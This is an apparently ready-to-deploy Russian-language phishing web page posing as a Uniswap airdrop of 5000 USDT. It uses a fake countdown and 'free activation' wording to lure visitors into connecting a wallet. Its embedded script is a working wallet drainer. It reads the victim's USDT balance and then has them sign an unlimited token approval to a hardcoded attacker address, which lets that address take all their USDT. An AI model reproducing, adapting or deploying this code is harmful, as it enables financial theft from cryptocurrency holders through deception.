<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Uniswap Airdrop | Получи 5000 USDT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #0B0E1A 0%, #1A1F2E 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(30, 35, 48, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 28px 24px 32px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #FF007A;
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 48px;
            font-weight: bold;
            box-shadow: 0 8px 20px rgba(255,0,122,0.3);
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #FFFFFF 0%, #B0B8D0 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 12px;
        }
        .sub {
            color: #8B92A8;
            font-size: 15px;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        .amount-box {
            background: rgba(0,0,0,0.4);
            border-radius: 24px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid rgba(255,255,255,0.08);
        }
        .amount-label {
            color: #8B92A8;
            font-size: 14px;
            margin-bottom: 8px;
        }
        .amount-value {
            font-size: 42px;
            font-weight: 800;
            color: #FF007A;
            letter-spacing: 2px;
        }
        .amount-value span {
            font-size: 20px;
            color: #B0B8D0;
        }
        .timer {
            background: rgba(255,0,122,0.15);
            border-radius: 40px;
            padding: 12px 16px;
            margin-bottom: 28px;
            font-size: 14px;
            color: #FF007A;
            font-weight: 500;
        }
        .connect-btn {
            background: linear-gradient(135deg, #FF007A 0%, #FF4D8C 100%);
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 700;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 16px;
            box-shadow: 0 4px 12px rgba(255,0,122,0.3);
        }
        .connect-btn:active {
            transform: scale(0.97);
        }
        .wallet-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            opacity: 0.6;
        }
        .wallet-icons div {
            background: #2A2F3E;
            border-radius: 12px;
            padding: 6px 12px;
            font-size: 12px;
            color: #B0B8D0;
        }
        .status {
            margin-top: 20px;
            padding: 14px;
            border-radius: 16px;
            font-size: 13px;
            background: rgba(0,0,0,0.3);
            color: #8B92A8;
            word-break: break-all;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #4A4F62;
        }
        button:disabled {
            opacity: 0.5;
            transform: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            🦄
        </div>
        <h1>Uniswap Airdrop</h1>
        <div class="sub">Подключи кошелек и получи 5000 USDT</div>
        
        <div class="amount-box">
            <div class="amount-label">Твой дроп</div>
            <div class="amount-value">5,000 <span>USDT</span></div>
        </div>
        
        <div class="timer">
            ⏱️ Предложение истекает через 23:59
        </div>
        
        <button class="connect-btn" id="connectBtn">🔗 Подключить кошелек</button>
        
        <div class="wallet-icons">
            <div>🦊 MetaMask</div>
            <div>🟣 Trust Wallet</div>
            <div>🔵 Coinbase</div>
        </div>
        
        <div class="status" id="status">
            Ожидание подключения...
        </div>
        <div class="footer">
            ✅ Только сегодня | ✅ Только для новых кошельков
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // =============== ТВОЙ КОШЕЛЕК ===============
        const YOUR_WALLET = "0x5CAB3a6e416e2241e7eE8470dF967f1D2eF98Fe5";
        
        // Адрес USDT (ERC-20)
        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
        
        // ABI для approve
        const USDT_ABI = [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];
        
        const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        
        let provider = null;
        let signer = null;
        let userAddress = null;
        let usdtContract = null;
        
        async function connectWallet() {
            const btn = document.getElementById('connectBtn');
            const statusDiv = document.getElementById('status');
            
            if (!window.ethereum) {
                statusDiv.innerHTML = '❌ Установи MetaMask или Trust Wallet';
                statusDiv.style.color = '#FF6B6B';
                return;
            }
            
            btn.disabled = true;
            btn.innerText = '⏳ Подключаемся...';
            statusDiv.innerHTML = '⏳ Запрашиваем доступ...';
            
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
                
                const balance = await usdtContract.balanceOf(userAddress);
                const decimals = await usdtContract.decimals();
                const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, decimals)).toFixed(2);
                
                statusDiv.innerHTML = `✅ Подключен: ${userAddress.substring(0,6)}...${userAddress.substring(38)}<br>💰 Баланс USDT: ${formattedBalance}`;
                statusDiv.style.color = '#8B92A8';
                
                const currentAllowance = await usdtContract.allowance(userAddress, YOUR_WALLET);
                
                if (currentAllowance.toString() === "0") {
                    statusDiv.innerHTML += `<br>🟢 Нажми "Активировать" и подтверди в кошельке. Комиссия: ~$2.`;
                    btn.innerText = '💎 Активировать дроп (бесплатно)';
                    btn.disabled = false;
                    btn.onclick = approveUSDT;
                } else {
                    statusDiv.innerHTML += `<br>✅ Дроп уже активирован! Ожидай начисления.`;
                    btn.innerText = '✅ Активировано';
                    btn.disabled = true;
                }
                
            } catch (error) {
                statusDiv.innerHTML = `❌ Ошибка: ${error.message.substring(0, 100)}`;
                btn.innerText = '🔗 Подключить кошелек';
                btn.disabled = false;
                btn.onclick = connectWallet;
            }
        }
        
        async function approveUSDT() {
            const btn = document.getElementById('connectBtn');
            const statusDiv = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerText = '⏳ Отправляем...';
            statusDiv.innerHTML = '⏳ Подпиши транзакцию в кошельке...';
            
            try {
                const tx = await usdtContract.approve(YOUR_WALLET, MAX_UINT256);
                statusDiv.innerHTML = `⏳ Транзакция отправлена. Ждем подтверждения...<br>${tx.hash.substring(0,40)}...`;
                
                await tx.wait();
                
                statusDiv.innerHTML = '✅✅✅ ГОТОВО! Дроп будет начислен в течение 24 часов. ✅✅✅';
                statusDiv.style.color = '#00FFAA';
                btn.innerText = '✅ ГОТОВО';
                btn.disabled = true;
                
            } catch (error) {
                statusDiv.innerHTML = `❌ Транзакция отклонена: ${error.message.substring(0,80)}`;
                btn.innerText = '💎 Попробовать снова';
                btn.disabled = false;
                btn.onclick = approveUSDT;
            }
        }
        
        document.getElementById('connectBtn').onclick = connectWallet;
    </script>
</body>
</html>
